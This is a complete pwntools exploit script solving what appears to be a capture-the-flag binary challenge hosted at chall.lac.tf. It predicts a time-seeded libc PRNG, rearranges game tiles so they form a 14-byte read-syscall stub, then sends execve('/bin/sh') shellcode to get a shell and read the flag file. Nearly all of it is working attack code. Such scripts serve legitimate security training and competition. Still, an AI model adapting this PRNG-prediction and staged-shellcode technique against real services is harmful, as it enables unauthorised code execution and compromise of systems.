#!/usr/bin/env python3
from pwn import *
import ctypes, time

exe = ELF("./chall")
context.binary = exe
context.arch = "amd64"
libc = ctypes.CDLL("libc.so.6")

BOARD_ADDR = 0x13370000
HAND_SIZE = 14

if args.REMOTE:
    r = remote("chall.lac.tf", 31338)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)


# stage1: read(0, BOARD_ADDR + HAND_SIZE, 0x80)
#   xor eax, eax         ; 31 c0          (2)  rax = 0 (SYS_read)
#   cdq                  ; 99             (1)  rdx = 0 (sign-extend eax)
#   xor edi, edi         ; 31 ff          (2)  rdi = 0 (stdin)
#   mov esi, ADDR+14     ; be 0e 00 37 13 (5)  rsi = write destination
#   mov dl,  0xff        ; b2 ff          (2)  rdx = 0xff (count)
#   syscall              ; 0f 05          (2)
#                                         ---- 14 bytes total
stage1 = asm('''
    xor eax, eax
    cdq
    xor edi, edi
    mov esi, {}
    mov dl, 0xff
    syscall
'''.format(hex(BOARD_ADDR + HAND_SIZE)))
assert len(stage1) == HAND_SIZE, \
    f"Stage 1 is {len(stage1)} bytes, expected {HAND_SIZE}"
print(f"Stage 1 ({len(stage1)} bytes): {stage1.hex()}")
target = list(stage1)

# stage2: shellcode  execve("/bin/sh", NULL, NULL)
stage2 = asm(shellcraft.sh())


def parse_hand():
    output = r.recvuntil(b'> ')
    # A tile is just a two digit number
    tile_match = re.findall(rb'\| ([0-9a-f]{2}) ', output)
    hand = [int(x, 16) for x in tile_match]
    print(f"Actual hand: {' '.join(f'{b:02x}' for b in hand)}")
    return hand

# Returns -1 on failure
# Note we advance the PRNG by HAND_SIZE from this
def get_seed(actual_hand):
    seed = int(time.time())
    libc.srand(seed)

    def gen_hand():
        return [libc.rand() & 0xFF for _ in range(HAND_SIZE)]

    hand = gen_hand()
    if hand == actual_hand:
        return seed

    print("PRNG mismatch, trying nearby seeds...")
    for offset in [-1, 1, -2, 2]:
        libc.srand(seed + offset)
        test = gen_hand()
        if test == actual_hand:
            print(f"Matched with seed offset: {offset}")
            return seed + offset
    return -1

def perform_swaps(hand, target):
    # remaining: index_to_swap -> target_byte
    remaining = {}
    for i in range(HAND_SIZE):
        if hand[i] != target[i]:
            remaining[i] = target[i]
    print(f"Tiles to swap: {len(remaining)} / {HAND_SIZE}")
    # need = desired_byte -> set(indices) 
    # Almost always will a byte map to a singular index though
    need = defaultdict(set)
    for i, b in remaining.items():
        need[b].add(i)

    # Optimized swap strategy:
    #   Each swap consumes one rand() value. We predict the next value and, if it
    #   matches a tile we still need, swap that tile. Otherwise we "waste" the
    #   swap on any remaining tile (we'll fix it later when the right value comes).
    swaps = 0
    while remaining:
        next_val = libc.rand() & 0xFF

        if next_val in need and need[next_val]:
            tile = need[next_val].pop()
            # need is a set its empty
            if not need[next_val]:
                del need[next_val]
            # tile is fixed
            del remaining[tile]
        else:
            # Waste the swap on any remaining tile
            tile = next(iter(remaining))

        r.sendline(b'1')
        r.recvuntil(b': ')
        r.sendline(str(tile).encode())
        r.recvuntil(b'> ')
        swaps += 1

    print(f"Finished in {swaps} swaps")


# Exploit
actual_hand = parse_hand()
seed = get_seed(actual_hand)
if seed == -1:
    print("Failed to get seed")
    exit(1)
perform_swaps(actual_hand, target)

# Play, sends the stage1 payload
r.sendline(b'2')
r.recvuntil(b'TRIPLE WORD SCORE!')
sleep(0.1) 

# Sends the shellcode
print(f"Stage 2 {len(stage2)} bytes): {stage2.hex()}")
r.send(stage2)
r.sendline(b"cat /app/flag.txt")
r.interactive()
